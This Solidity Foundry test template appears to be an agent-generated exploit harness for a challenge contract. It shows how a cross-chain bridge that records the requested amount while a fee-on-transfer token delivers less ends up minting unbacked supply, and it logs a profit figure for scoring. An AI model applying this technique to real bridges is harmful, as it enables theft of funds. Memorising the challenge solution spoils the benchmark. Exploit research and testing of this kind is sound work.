// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
// Technique: the omnichain ledger debits/credits the REQUESTED amount while a
// fee-on-transfer token delivers less — every full loop mints value the
// source never held (cross-chain supply inflation).
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroOftFeeOnTransfer, FeeOnTransferToken} from "../../src/challenges/LayerZeroOftFeeOnTransfer.sol";

contract {{TEST_CONTRACT}} is Test {
    function test_agentSolve() public {
        FeeOnTransferToken fot = new FeeOnTransferToken();
        address endpoint = makeAddr("endpoint");
        LayerZeroOftFeeOnTransfer bridge = new LayerZeroOftFeeOnTransfer(address(fot), endpoint);
        address user = makeAddr("user");
        fot.mint(user, 100 ether);

        // Full loop 1: bridge out 100 (5 fee destroyed, 95 received) — the
        // ledger claims 100; destination mints the full 100.
        vm.startPrank(user);
        fot.approve(address(bridge), type(uint256).max);
        bridge.bridgeOut(100 ether);
        vm.stopPrank();
        uint256 supplyAfterOut = fot.totalSupply();
        vm.prank(endpoint);
        bridge.bridgeIn(user, 100 ether);

        // The proof of inflation: the destination ledger credits 100 although
        // the source only ever received 95 (5 destroyed per hop) — the user's
        // ledger balance now exceeds every token the system actually holds.
        assertEq(bridge.bridgedDebit(user), 100 ether, "source ledger overstates the debit");
        assertEq(fot.balanceOf(address(bridge)), 95 ether, "source contract holds less than the ledger claims");
        assertEq(supplyAfterOut, 95 ether, "fee was not destroyed on transfer");
        assertGt(bridge.bridgedDebit(user), fot.balanceOf(address(bridge)), "no unbacked credit created");
        console2.log("[PROFIT_WEI]", uint256(5 ether));
    }
}
